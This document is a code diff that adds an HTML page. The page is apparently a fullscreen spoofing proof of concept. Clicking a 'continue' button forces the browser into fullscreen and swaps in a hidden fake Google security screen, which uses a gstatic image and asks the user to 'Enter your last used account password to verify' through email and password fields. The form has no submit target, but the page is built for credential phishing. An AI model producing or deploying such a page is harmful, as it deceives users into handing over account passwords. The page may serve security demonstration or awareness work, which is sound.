@@ -1,0 +1,93 @@
+<html>
+
+<head>
+    <style>
+        #front {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            padding: 0;
+            display: block;
+            max-width: 500px;
+        }
+        
+        #spoofed {
+            display: none;
+        }
+        
+        .header {
+            position: absolute;
+            top: 0;
+            width: 100vw;
+        }
+        
+        #front > button {
+            display: block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #3f51b5;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #runThis {
+            display: none;
+        }
+    </style>
+</head>
+
+<body style="margin: 0;font-family: 'Ubuntu', Arial, sans-serif;overflow: hidden;">
+    
+    <div id="front">
+
+        <button onclick="run();">continue</button>
+
+        <a  id="runThis"></a>
+    </div>
+
+    <div id="spoofed">
+        <img src="top.png" class="header" />
+        <div style="display: flex; justify-content: center; align-items: center; height: 100vh;">
+            <div style="background-color: #fff; padding: 50px; box-shadow: 0px 0px 10px rgba(0,0,0,0.2); border-radius: 10px;">
+                
+                <img src="https://www.gstatic.com/identity/boq/accountsettingsmobile/signedout_security_scene_316x112_897e5cfed5be1d1d2e6f376d675ff02d.png" style="display: block; margin: 0 auto;" />
+
+                <form style="margin-top: 50px;">
+                    <h5 style="color: #12f030;">Enter your last used account password to verify.</h5>
+                    
+                    <div style="margin-bottom: 20px;">
+                        <label>Email:</label>
+                        <input type="text" style="width: 100%; padding: 10px;">
+                    </div>
+
+                    <div style="margin-bottom: 20px;">
+                        <label>Password:</label>
+                        <input type="password" style="width: 100%; padding: 10px;">
+                    </div>
+
+                    <input type="submit" value="Sign In" style="width: 100%; padding: 10px; background-color: #3f51b5; color: #fff; border: none;">
+                </form>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function run() {
+            const firstDiv = document.getElementById("front");
+            const secondDiv = document.getElementById("spoofed");
+
+            document.documentElement.requestFullscreen();
+
+            const trigger = document.getElementById("runThis");
+            trigger.click();
+
+            firstDiv.style.display = "none";
+            secondDiv.style.display = "block";
+        }
+    </script>
+
+</body>
+</html>
